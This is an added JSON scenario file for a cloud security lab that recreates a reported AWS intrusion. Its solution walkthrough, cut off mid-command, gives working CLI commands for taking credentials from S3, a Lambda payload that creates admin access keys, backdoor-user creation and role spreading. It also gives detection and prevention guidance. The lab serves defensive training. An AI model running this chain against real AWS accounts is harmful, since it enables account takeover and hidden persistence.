@@ -1,0 +1,498 @@
+{
+  "displayName": "AI-Assisted Cloud Intrusion: 8 Minutes to Admin",
+  "name": "sysdig-8-minutes-to-admin",
+  "description": "Recreation of the attack documented by Sysdig Threat Research Team: IAM credentials embedded in a private S3 RAG bucket, Lambda code injection, and admin access achieved in under 8 minutes",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": null,
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "Attack Simulation",
+  "subCategory": "",
+  "pathType": "attack-simulation",
+  "target": "to-admin",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0001 - Initial Access",
+      "TA0007 - Discovery",
+      "TA0004 - Privilege Escalation",
+      "TA0003 - Persistence",
+      "TA0005 - Defense Evasion",
+      "TA0009 - Collection",
+      "TA0011 - Impact"
+    ],
+    "techniques": [
+      "T1552.001 - Credentials In Files",
+      "T1087.004 - Cloud Accounts",
+      "T1613 - Container and Resource Discovery",
+      "T1648 - Serverless Execution",
+      "T1098.001 - Additional Cloud Credentials",
+      "T1078.004 - Cloud Accounts",
+      "T1530 - Data from Cloud Storage Object",
+      "T1496 - Resource Hijacking"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_attack_simulation_sysdig_8_minutes_to_admin",
+    "modulePath": "modules/scenarios/attack-simulation/sysdig-8-minutes-to-admin"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/attack-simulation/sysdig-8-minutes-to-admin",
+  "schemaVersion": "4.6.0",
+  "source": {
+    "url": "https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes",
+    "title": "AI-Assisted Cloud Intrusion Achieves Admin Access in 8 Minutes",
+    "author": "Alessandro Brucato and Michael Clark (Sysdig Threat Research Team)",
+    "date": "2026-02-03"
+  },
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-8min-starting-user",
+        "required": [
+          {
+            "permission": "s3:ListBucket",
+            "resource": "arn:aws:s3:::pl-prod-8min-rag-data-{account_id}-{suffix}",
+            "description": "enumerate the contents of the private RAG data bucket to find the embedded credentials file"
+          },
+          {
+            "permission": "s3:GetObject",
+            "resource": "arn:aws:s3:::pl-prod-8min-rag-data-{account_id}-{suffix}/*",
+            "description": "download the RAG pipeline config file that contains embedded IAM credentials"
+          }
+        ],
+        "helpful": []
+      },
+      {
+        "name": "pl-prod-8min-compromised-user",
+        "required": [
+          {
+            "permission": "lambda:UpdateFunctionCode",
+            "resource": "arn:aws:lambda:*:*:function/pl-prod-8min-ec2-init",
+            "description": "replace the Lambda function's code with a malicious payload that calls iam:CreateAccessKey"
+          },
+          {
+            "permission": "lambda:UpdateFunctionConfiguration",
+            "resource": "arn:aws:lambda:*:*:function/pl-prod-8min-ec2-init",
+            "description": "modify function environment variables to pass target user names to the injected handler"
+          },
+          {
+            "permission": "lambda:InvokeFunction",
+            "resource": "arn:aws:lambda:*:*:function/pl-prod-8min-ec2-init",
+            "description": "trigger the injected code to execute iam:CreateAccessKey using the function's privileged execution role"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "iam:ListUsers",
+            "purpose": "discover admin user frick and other high-privilege accounts to target"
+          },
+          {
+            "permission": "iam:ListAccessKeys",
+            "purpose": "enumerate existing access keys to understand credential posture"
+          },
+          {
+            "permission": "iam:ListAttachedUserPolicies",
+            "purpose": "confirm frick has AdministratorAccess policy attached"
+          },
+          {
+            "permission": "iam:GetUser",
+            "purpose": "get detailed info on targeted users"
+          },
+          {
+            "permission": "iam:ListRoles",
+            "purpose": "discover assumable roles for lateral movement"
+          },
+          {
+            "permission": "iam:GetRole",
+            "purpose": "inspect role trust policies to identify which roles can be assumed"
+          },
+          {
+            "permission": "lambda:ListFunctions",
+            "purpose": "discover EC2-init Lambda function with the privileged execution role"
+          },
+          {
+            "permission": "lambda:GetFunction",
+            "purpose": "view Lambda configuration to identify its execution role and permissions"
+          },
+          {
+            "permission": "s3:ListAllMyBuckets",
+            "purpose": "enumerate all S3 buckets as data collection targets after escalation"
+          },
+          {
+            "permission": "bedrock:ListFoundationModels",
+            "purpose": "enumerate available Bedrock models for unauthorized invocation"
+          },
+          {
+            "permission": "bedrock:GetModelInvocationLoggingConfiguration",
+            "purpose": "verify Bedrock logging is disabled before invoking models"
+          },
+          {
+            "permission": "ssm:DescribeParameters",
+            "purpose": "discover SSM parameters containing sensitive configuration"
+          },
+          {
+            "permission": "secretsmanager:ListSecrets",
+            "purpose": "discover secrets available for data collection"
+          },
+          {
+            "permission": "sts:GetCallerIdentity",
+            "purpose": "verify current identity at each stage of the attack chain"
+          },
+          {
+            "permission": "sts:AssumeRole",
+            "purpose": "assume low-privilege roles (sysadmin, developer, account) for reconnaissance; post-escalation, frick assumes all 5 roles (adding netadmin, external) across 12 sessions for identity spreading"
+          }
+        ]
+      },
+      {
+        "name": "pl-prod-8min-ec2-init-role",
+        "required": [
+          {
+            "permission": "iam:CreateAccessKey",
+            "resource": "arn:aws:iam::*:user/pl-prod-8min-frick",
+            "description": "create new access keys for the admin user frick, granting full administrative access"
+          },
+          {
+            "permission": "iam:CreateAccessKey",
+            "resource": "arn:aws:iam::*:user/pl-prod-8min-admingh",
+            "description": "the execution role also has this permission on admingh, which is a decoy (first injection attempt fails here)"
+          }
+        ],
+        "helpful": []
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to recreate the attack chain from [AI-Assisted Cloud Intrusion Achieves Admin Access in 8 Minutes](https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes), where an attacker moved from the `pl-prod-8min-starting-user` IAM user to full administrative access by extracting embedded credentials from a private S3 RAG bucket, injecting malicious code into an over-privileged Lambda function, and using that function's execution role to create admin access keys \u2014 all in under eight minutes with AI assistance.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-8min-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:user/pl-prod-8min-frick`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew tap DataDog/pathfinding-labs https://github.com/DataDog/pathfinding-labs\n   brew install DataDog/pathfinding-labs/plabs\n   ```\n   Or with Go 1.25+ installed:\n   ```bash\n   go install github.com/DataDog/pathfinding-labs/cmd/plabs@latest\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable sysdig-8-minutes-to-admin\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `sysdig-8-minutes-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-starting-user` | Entry point user \u2014 has s3:ListBucket + s3:GetObject on the RAG bucket only |\n| `arn:aws:s3:::pl-prod-8min-rag-data-{account_id}-{suffix}` | Private S3 bucket containing RAG pipeline data and an embedded credentials file |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-compromised-user` | Second-stage user extracted from S3 \u2014 has Lambda R/W + IAM list + Bedrock list |\n| `arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role` | Low-privilege assumable role (recon target, identity spreading) |\n| `arn:aws:iam::{account_id}:role/pl-prod-8min-developer-role` | Low-privilege assumable role (recon target, identity spreading) |\n| `arn:aws:iam::{account_id}:role/pl-prod-8min-account-role` | Low-privilege assumable role (recon target, identity spreading) |\n| `arn:aws:iam::{account_id}:role/pl-prod-8min-netadmin-role` | Low-privilege assumable role (identity spreading only) |\n| `arn:aws:iam::{account_id}:role/pl-prod-8min-external-role` | Low-privilege assumable role (identity spreading only) |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-admingh` | Decoy user \u2014 no useful permissions (first injection attempt fails here) |\n| `arn:aws:lambda:{region}:{account_id}:function/pl-prod-8min-ec2-init` | Over-privileged Lambda function \u2014 injection target |\n| `arn:aws:iam::{account_id}:role/pl-prod-8min-ec2-init-role` | Lambda execution role with iam:CreateAccessKey on frick and admingh |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-frick` | Admin target \u2014 has AdministratorAccess |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-rocker` | Secondary persistence target \u2014 has BedrockFullAccess |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-azureadmanager` | Identity spreading target \u2014 Azure AD integration service account |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-deploy-svc` | Identity spreading target \u2014 deployment service account |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-monitoring` | Identity spreading target \u2014 monitoring service account |\n| `arn:aws:iam::{account_id}:user/pl-prod-8min-ci-runner` | Identity spreading target \u2014 CI/CD runner service account |\n| `arn:aws:secretsmanager:{region}:{account_id}:secret:pl-prod-8min-db-credentials` | Data collection target \u2014 simulates database credentials |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pl/8min/api-key` | Data collection target \u2014 simulates API key in SSM |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin` | CTF flag \u2014 readable only with admin credentials (pl-prod-8min-frick or equivalent) |",
+      "modificationsFromOriginal": "The following changes were made to the original November 2025 attack to make it suitable for a self-hosted lab environment:\n\n- **Credentials location changed from public to private S3**: In the original attack, IAM credentials were discovered in a publicly accessible S3 bucket. In this lab, the bucket is private and requires the `pl-prod-8min-starting-user` credentials as an explicit entry point.\n- **GPU instance downsized**: The original attack launched a `p4d.24xlarge` instance for ML model training. This lab uses a `p3.2xlarge` (cheapest p-series at $3.06/hr) to keep costs manageable. The instance still launches and auto-terminates after 2 hours.\n- **Cross-account movement simplified to failed attempts**: The original attack included failed cross-account role assumption attempts against hallucinated account IDs. In this lab those attempts are simulated \u2014 the demo script runs the `sts:AssumeRole` calls against placeholder account IDs and shows the `AccessDenied` errors as they appeared in the original.\n- **Bedrock invocations reduced to 3 models**: The original attack invoked numerous Bedrock models. This lab demos three (Claude Haiku, Nova Lite, and DeepSeek R1) to demonstrate the pattern without incurring significant inference costs.\n- **Lambda injection target renamed**: The original function name from the blog post has been replaced with `pl-prod-8min-ec2-init` to fit the Pathfinding Labs naming convention.",
+      "demoAttack": {
+        "executing": "The demo script follows the chronological order of the original attack, including reconnaissance, failed attempts, and AI-assisted decision making as described in the Sysdig TRT blog post. The script will:\n\nThe script will:\n\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation",
+        "resourcesCreated": "- Access keys for `pl-prod-8min-frick` (admin user) \u2014 created via Lambda injection\n- 12 role assumption sessions across 5 roles (sysadmin, account, netadmin, developer, external)\n- IAM user `backdoor-admin` with AdministratorAccess attached\n- Access keys for `backdoor-admin`\n- Access keys for `pl-prod-8min-rocker`\n- Access keys for `pl-prod-8min-azureadmanager`, `pl-prod-8min-deploy-svc`, `pl-prod-8min-monitoring`, `pl-prod-8min-ci-runner`\n- EC2 key pair `pl-8min-gpu-key` (used for GPU instance)\n- EC2 security group `pl-8min-gpu-sg` with all inbound ports open to 0.0.0.0/0\n- EC2 `p3.2xlarge` GPU instance with 2-hour auto-shutdown",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo sysdig-8-minutes-to-admin\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `sysdig-8-minutes-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup sysdig-8-minutes-to-admin\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `sysdig-8-minutes-to-admin` in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable sysdig-8-minutes-to-admin\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `sysdig-8-minutes-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- **IAM credentials embedded in S3 object data**: The file `config/rag-pipeline-config.json` in the RAG bucket contains plaintext IAM access keys. CSPM tools that scan S3 object contents for credential patterns should flag this.\n- **Lambda execution role with iam:CreateAccessKey on users**: `pl-prod-8min-ec2-init-role` has `iam:CreateAccessKey` on `pl-prod-8min-frick` (AdministratorAccess). A Lambda execution role with the ability to create credentials for admin users is a privilege escalation path \u2014 no compute role should hold `iam:CreateAccessKey` on privileged users.\n- **Over-permissive Lambda execution role**: `pl-prod-8min-ec2-init-role` can create access keys for IAM users from a Lambda function context. IAM Analyzer's unused access findings should surface this if the function has never legitimately called `iam:CreateAccessKey`.\n- **User with Lambda write access (UpdateFunctionCode + UpdateFunctionConfiguration)**: `pl-prod-8min-compromised-user` has write access to the Lambda function's code and configuration. Any principal that can update Lambda code on a function with a privileged execution role has an indirect privilege escalation path.\n- **User (rocker) with unrestricted Bedrock access**: `pl-prod-8min-rocker` has `BedrockFullAccess`. Broad AI service access without logging or guardrails is a cost/data exfiltration risk.\n- **Secrets Manager and SSM parameters without resource-based access controls**: The `pl-prod-8min-db-credentials` secret and `/pl/8min/api-key` parameter are accessible to the compromised-user after escalation. Sensitive parameters should require explicit resource-based policies and logging.\n- **Multiple IAM roles with overly broad trust policies**: Five roles (`sysadmin`, `account`, `netadmin`, `developer`, `external`) trust the account root, allowing any principal with `sts:AssumeRole` to assume them. After gaining admin access, the attacker exploits this to spread across 12 role sessions \u2014 a technique that distributes CloudTrail activity across identities and complicates incident response.\n- **Pre-existing service account users without access key rotation or monitoring**: Four service accounts (`azureadmanager`, `deploy-svc`, `monitoring`, `ci-runner`) exist with no access key rotation enforcement. The attacker creates access keys for all of them to establish persistence across multiple identities.",
+        "prevention": "- **Scan S3 object contents for secrets**: Use Amazon Macie or a third-party DLP tool to detect plaintext credentials embedded in data files. Enable Macie on all buckets that handle pipeline configurations, model training data, or application configs.\n- **Restrict iam:CreateAccessKey to identity-management roles only**: No Lambda execution role, EC2 instance profile, or application role should have `iam:CreateAccessKey` on users with elevated permissions. Use SCPs to enforce this at the organization level:\n  ```json\n  {\n    \"Effect\": \"Deny\",\n    \"Action\": \"iam:CreateAccessKey\",\n    \"Resource\": \"*\",\n    \"Condition\": {\n      \"ArnNotLike\": {\n        \"aws:PrincipalArn\": \"arn:aws:iam::*:role/identity-management-*\"\n      }\n    }\n  }\n  ```\n- **Apply least privilege to Lambda execution roles**: Lambda functions should have only the permissions required for their stated purpose. An EC2 initialization function has no legitimate reason to create IAM access keys. Use IAM Access Analyzer to detect unused permissions in execution roles.\n- **Restrict lambda:UpdateFunctionCode to deployment pipelines only**: Principals that are not CI/CD pipelines should not have `lambda:UpdateFunctionCode` or `lambda:UpdateFunctionConfiguration` on production functions. Gate these permissions behind MFA conditions or SCP deny rules for human principals.\n- **Enable Bedrock model invocation logging**: Configure Bedrock to log all `InvokeModel` calls to CloudWatch Logs. Unauthorized model usage for IP theft or prompt injection is undetectable without invocation logs.\n- **Use IAM roles for applications instead of long-lived IAM user credentials**: The original attack succeeded because a long-lived access key was embedded in a config file. Workloads running in AWS should use IAM roles with short-lived credentials (EC2 instance profiles, ECS task roles, Lambda execution roles) \u2014 never static IAM user keys.\n- **Enforce access key rotation and maximum key age for service accounts**: The attacker created access keys for 5 pre-existing service accounts (`rocker`, `azureadmanager`, `deploy-svc`, `monitoring`, `ci-runner`) to establish persistence across multiple identities. SCPs or AWS Config rules that enforce maximum access key age and limit the number of active keys per user reduce the window for identity-spreading persistence.\n- **Limit role trust policies to specific principals**: The 5 assumable roles in this account trust `:root`, allowing any principal with `sts:AssumeRole` to assume them. Restricting trust policies to the specific principals that need each role reduces the blast radius when a single admin account is compromised."
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `s3:GetObject` -- object retrieval from data pipeline buckets; flag when the object key matches patterns like `*config*`, `*credentials*`, `*secret*`, or `*key*`\n- `iam:ListUsers` -- bulk IAM enumeration; when called by a non-human principal (Lambda execution role, EC2 instance profile) outside a deployment context, indicates reconnaissance\n- `iam:ListAttachedUserPolicies` -- policy enumeration on specific users; combined with ListUsers, indicates an attacker mapping privilege levels\n- `lambda:GetFunction20150331v2` -- function configuration retrieval; note when caller is not the owner account's deployment role and the function has a privileged execution role\n- `lambda:UpdateFunctionCode20150331v2` -- code replacement on a Lambda function; critical when followed within seconds by an invocation of the same function\n- `lambda:UpdateFunctionConfiguration20150331v2` -- configuration change; combined with UpdateFunctionCode, almost certainly indicates code injection\n- `lambda:InvokeFunction` -- function invocation; correlate with recent UpdateFunctionCode events to detect injection-then-invoke attack pattern\n- `iam:CreateAccessKey` -- new credentials created; critical when the caller is a Lambda execution role ARN (not a human user), indicating Lambda-mediated credential theft\n- `iam:CreateUser` -- new IAM user created; combined with AttachUserPolicy for AdministratorAccess within seconds, indicates backdoor account creation\n- `iam:AttachUserPolicy` -- managed policy attached to user; flag immediately when the policy ARN is `arn:aws:iam::aws:policy/AdministratorAccess`\n- `sts:AssumeRole` -- role assumption; a burst of failures followed by successes (as seen in this attack) indicates automated role enumeration; post-escalation, a single principal assuming many roles with varied session names (explore, test, pwned, escalation) within a short window indicates identity spreading for persistence\n- `iam:CreateAccessKey` (bulk) -- multiple `CreateAccessKey` calls targeting different users from a single session within minutes; this pattern indicates an attacker establishing persistence across multiple pre-existing identities\n- `bedrock:InvokeModel` -- AI model invocation; flag when caller is not a known application role, or when called immediately after a period of IAM/Lambda enumeration\n- `ec2:RunInstances` -- instance launch; flag `p`-series instance types (GPU), especially combined with a CreateKeyPair + CreateSecurityGroup burst in the same session\n- `ec2:CreateSecurityGroup` + `ec2:AuthorizeSecurityGroupIngress` -- new security group with 0.0.0.0/0 inbound on port 22, created immediately before RunInstances, indicates attacker-controlled compute provisioning\n- `secretsmanager:GetSecretValue` -- secret retrieval; flag when the caller is not the application that owns the secret\n- `ssm:GetParameter` -- parameter retrieval; flag when the parameter path contains `key`, `secret`, `password`, or `token` and the caller is not an expected application role",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [AI-Assisted Cloud Intrusion Achieves Admin Access in 8 Minutes](https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes) -- Original Sysdig TRT blog post documenting the November 2025 attack; the primary source for this lab\n- [MITRE ATT&CK: T1552.001 - Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) -- Technique for discovering credentials stored in plaintext files\n- [MITRE ATT&CK: T1648 - Serverless Execution](https://attack.mitre.org/techniques/T1648/) -- Abuse of serverless functions for code execution and privilege escalation\n- [MITRE ATT&CK: T1098.001 - Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001/) -- Creating additional access keys to maintain persistence\n- [MITRE ATT&CK: T1496 - Resource Hijacking](https://attack.mitre.org/techniques/T1496/) -- Unauthorized use of compute resources for ML model training\n- [Amazon Macie - Sensitive Data Discovery](https://docs.aws.amazon.com/macie/latest/user/what-is-macie.html) -- AWS service for detecting secrets and PII in S3 objects",
+    "solution": "# Solution: AI-Assisted Cloud Intrusion: 8 Minutes to Admin\n\nOn November 28, 2025, the Sysdig Threat Research Team observed a real attack against one of their customer environments. The attacker found exposed IAM credentials in a public S3 bucket \u2014 the kind of mistake that shows up in security awareness training slides \u2014 and within eight minutes had achieved full administrative access, created a backdoor account, invoked AI models, and launched a GPU instance for ML model training. All of this was accomplished with the help of an AI assistant that automated reconnaissance decisions, interpreted API errors, and suggested the next attack step in real time.\n\nWhat made this attack remarkable was not any single technique. IAM credential theft from S3, Lambda code injection, and GPU instance hijacking are all known attack patterns with documented playbooks. What was new was the speed and automation. AI assistance collapsed the time between \"I have credentials\" and \"I have admin\" from hours to minutes by eliminating the research and troubleshooting steps that typically slow an attacker down. Techniques that required expertise to chain together could now be executed by someone following AI-generated instructions, iterating through failures in real time.\n\nThis lab recreates that attack chain in a self-contained environment. The credentials start in a private bucket (not public, to give you an explicit entry point), the GPU instance is downsized for cost, and cross-account movement attempts are simulated as failures. Everything else \u2014 the credential extraction, the Lambda injection, the two-phase injection with a decoy target, the backdoor creation, the Bedrock invocations, and the data collection \u2014 follows the original attack as documented by the Sysdig TRT team.\n\n## The Challenge\n\nYou start with credentials for `pl-prod-8min-starting-user` \u2014 an IAM user with access to exactly one S3 bucket: a private store of RAG pipeline data. That bucket contains a configuration file with IAM credentials embedded in plaintext.\n\nYour goal is to reach `pl-prod-8min-frick`, an IAM user with `AdministratorAccess`. The path runs through the S3 bucket, a second-stage IAM user with Lambda write access, and an over-privileged Lambda execution role that can create access keys for frick.\n\nSet your starting credentials:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<starting_user_access_key_id>\nexport AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>\nunset AWS_SESSION_TOKEN\n\naws sts get-caller-identity\n```\n\nYou should see `pl-prod-8min-starting-user`. Confirm the limited permissions:\n\n```bash\naws iam list-users --max-items 1\n# AccessDenied\naws lambda list-functions\n# AccessDenied\n```\n\nGood. You can only touch S3.\n\n## Reconnaissance\n\n### Stage 1: The RAG Bucket\n\nStart by listing the bucket. You know the bucket exists because your IAM policy explicitly names it \u2014 that alone is a clue about what to look for.\n\n```bash\naws s3 ls s3://pl-prod-8min-rag-data-{account_id}-{suffix} --recursive\n```\n\nYou will see several paths: document chunks, embeddings, and a `config/` directory. The config directory is what you want:\n\n```\n2025-11-28 07:43:12       4821 chunks/doc-001.txt\n2025-11-28 07:43:12       2048 embeddings/index.bin\n2025-11-28 07:43:12        892 config/rag-pipeline-config.json\n```\n\nDownload the config file:\n\n```bash\naws s3 cp s3://pl-prod-8min-rag-data-{account_id}-{suffix}/config/rag-pipeline-config.json /tmp/rag-pipeline-config.json\ncat /tmp/rag-pipeline-config.json\n```\n\nBuried inside the pipeline authentication block are plaintext IAM credentials:\n\n```json\n{\n  \"pipeline_name\": \"rag-v2\",\n  \"embedding_model\": \"amazon.titan-embed-text-v1\",\n  \"pipeline_auth\": {\n    \"aws_access_key_id\": \"AKIA...\",\n    \"aws_secret_access_key\": \"...\"\n  }\n}\n```\n\nA developer embedded these credentials directly in the config file rather than using AWS Secrets Manager or an IAM role. In the original attack, this file was in a public bucket. Here, it only requires the minimal starting credentials \u2014 but the root cause is identical.\n\nExtract and set the new credentials:\n\n```bash\nNEW_KEY=$(cat /tmp/rag-pipeline-config.json | jq -r '.pipeline_auth.aws_access_key_id')\nNEW_SECRET=$(cat /tmp/rag-pipeline-config.json | jq -r '.pipeline_auth.aws_secret_access_key')\n\nexport AWS_ACCESS_KEY_ID=\"$NEW_KEY\"\nexport AWS_SECRET_ACCESS_KEY=\"$NEW_SECRET\"\nunset AWS_SESSION_TOKEN\n\naws sts get-caller-identity\n```\n\nYou are now `pl-prod-8min-compromised-user`.\n\n### Stage 2: Mapping the Account\n\nThis is where the original attack demonstrated AI assistance most clearly. The AI processed API responses, identified which role assumptions would succeed or fail based on trust policy patterns, and directed the attacker toward the Lambda function as the escalation vector. You will do the same thing manually.\n\nFirst, enumerate all IAM users:\n\n```bash\naws iam list-users --query 'Users[*].[UserName,UserId]' --output table\n```\n\nYou will see several users including `pl-prod-8min-frick`, `pl-prod-8min-admingh`, `pl-prod-8min-rocker`, `pl-prod-8min-azureadmanager`, `pl-prod-8min-deploy-svc`, `pl-prod-8min-monitoring`, and `pl-prod-8min-ci-runner`. The names are suggestive \u2014 frick sounds like an admin, rocker could have elevated access, azureadmanager suggests Azure AD integration. Check what frick has attached:\n\n```bash\naws iam list-attached-user-policies --user-name pl-prod-8min-frick\n```\n\n```json\n{\n  \"AttachedPolicies\": [\n    {\n      \"PolicyName\": \"AdministratorAccess\",\n      \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"\n    }\n  ]\n}\n```\n\nThat is your target. Now enumerate Lambda functions:\n\n```bash\naws lambda list-functions \\\n  --query 'Functions[*].[FunctionName,Role]' \\\n  --output table\n```\n\nThe `pl-prod-8min-ec2-init` function stands out because its execution role is named `pl-prod-8min-ec2-init-role`. Look at that role's inline policies:\n\n```bash\naws iam get-role --role-name pl-prod-8min-ec2-init-role \\\n  --query 'Role.AssumeRolePolicyDocument'\n\naws iam list-role-policies --role-name pl-prod-8min-ec2-init-role\naws iam get-role-policy \\\n  --role-name pl-prod-8min-ec2-init-role \\\n  --policy-name ec2-init-policy\n```\n\nThe role policy reveals `iam:CreateAccessKey` on `pl-prod-8min-frick` and `pl-prod-8min-admingh`. An EC2 initialization function with the ability to create IAM credentials is not just a misconfiguration \u2014 it is an unguarded privilege escalation path. Anyone who can update and invoke this function can create admin credentials.\n\nTry some role assumptions to round out your reconnaissance. The original attacker's AI assistant tried generic role names first:\n\n```bash\n# These will fail\naws sts assume-role \\\n  --role-arn arn:aws:iam::{account_id}:role/admin \\\n  --role-session-name test 2>&1\n\naws sts assume-role \\\n  --role-arn arn:aws:iam::{account_id}:role/Administrator \\\n  --role-session-name test 2>&1\n\n# These will succeed (low-privilege roles, useful for recon)\naws sts assume-role \\\n  --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role \\\n  --role-session-name recon\n```\n\nThe sysadmin, developer, and account roles all trust the compromised user and can be assumed. They are not on the path to admin \u2014 but they expand the reconnaissance surface.\n\n## Exploitation\n\n### Phase 1: Lambda Code Injection (First Attempt \u2014 Decoy Target)\n\nThe execution role has `iam:CreateAccessKey` on both `admingh` and `frick`. The original attacker tried `admingh` first, possibly because it appeared before `frick` in an IAM enumeration or because an AI assistant suggested it based on the username pattern.\n\nWrite a minimal Lambda handler that calls `iam.create_access_key()` on a configurable target:\n\n```bash\ncat > /tmp/lambda_payload.py << 'EOF'\nimport boto3\nimport os\n\ndef handler(event, context):\n    target = os.environ.get('TARGET_USER', '')\n    iam = boto3.client('iam')\n    response = iam.create_access_key(UserName=target)\n    key = response['AccessKey']\n    return {\n        'AccessKeyId': key['AccessKeyId'],\n        'SecretAccessKey': key['SecretAccessKey'],\n        'UserName': key['UserName']\n    }\nEOF\n\ncd /tmp && zip lambda_payload.zip lambda_payload.py\n```\n\nUpload the malicious code:\n\n```bash\naws lambda update-function-code \\\n  --function-name pl-prod-8min-ec2-init \\\n  --zip-file fileb:///tmp/lambda_payload.zip\n```\n\nSet the first target to `admingh`:\n\n```bash\naws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-admingh}'\n```\n\nWait a few seconds for the update to propagate, then invoke:\n\n```bash\naws lambda invoke \\\n  --function-name pl-prod-8min-ec2-init \\\n  --payload '{}' \\\n  /tmp/lambda_response_admingh.json\n\ncat /tmp/lambda_response_admingh.json\n```\n\nThe invocation succeeds. You receive an access key ID and secret for `pl-prod-8min-admingh`. Test them:\n\n```bash\nexport AWS_ACCESS_KEY_ID=$(cat /tmp/lambda_response_admingh.json | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(cat /tmp/lambda_response_admingh.json | jq -r '.SecretAccessKey')\nunset AWS_SESSION_TOKEN\n\naws iam list-users --max-items 1\n# AccessDenied\n```\n\n`admingh` is a decoy with no useful permissions. The original attacker hit the same wall, recognized the failure (with AI assistance interpreting the error), and retargeted.\n\nSwitch back to the compromised user credentials before continuing:\n\n```bash\nexport AWS_ACCESS_KEY_ID=\"$NEW_KEY\"\nexport AWS_SECRET_ACCESS_KEY=\"$NEW_SECRET\"\nunset AWS_SESSION_TOKEN\n```\n\n### Phase 2: Lambda Code Injection (Second Attempt \u2014 Admin Target)\n\nThe code is already uploaded. All you need is to update the environment variable to point at `frick`:\n\n```bash\naws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-frick}'\n\naws lambda invoke \\\n  --function-name pl-prod-8min-ec2-init \\\n  --payload '{}' \\\n  /tmp/lambda_response_frick.json\n\ncat /tmp/lambda_response_frick.json\n```\n\nThis time the response contains access keys for `pl-prod-8min-frick`.\n\n### Reaching Admin\n\nConfigure frick's credentials:\n\n```bash\nexport AWS_ACCESS_KEY_ID=$(cat /tmp/lambda_response_frick.json | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(cat /tmp/lambda_response_frick.json | jq -r '.SecretAccessKey')\nunset AWS_SESSION_TOKEN\n```\n\n## Verification\n\nConfirm the admin identity:\n\n```bash\naws sts get-caller-identity\naws iam list-users --output table\n```\n\nYou are now operating as `pl-prod-8min-frick` with `AdministratorAccess`. Everything that follows replicates the original attacker's post-escalation activity.\n\n**Create a persistent backdoor:**\n\n```bash\naws iam create-user --user-name backdoor-admin\n\naws iam attach-user-policy \\\n  --user-name backdoor-admin \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\naws iam create-access-key --user-name backdoor-admin\n```\n\nThe original attack created this backdoor within the first minute of admin access. Even if frick's access keys are later rotated or deactivated, the backdoor user persists.\n\n**Identity spreading \u2014 role assumptions:**\n\nThe original attacker assumed six IAM roles across 14 sessions, distributing activity across multiple identities to complicate tracking. With admin access, assume every available role using different session names:\n\n```bash\n# Assume roles with varied session names \u2014 each creates a unique principal in CloudTrail\nfor ROLE in sysadmin account netadmin; do\n  for SESSION in explore test pwned; do\n    aws sts assume-role \\\n      --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-${ROLE}-role \\\n      --role-session-name $SESSION > /dev/null 2>&1 \\\n      && echo \"Assumed ${ROLE}-role (session: $SESSION)\"\n  done\ndone\n\naws 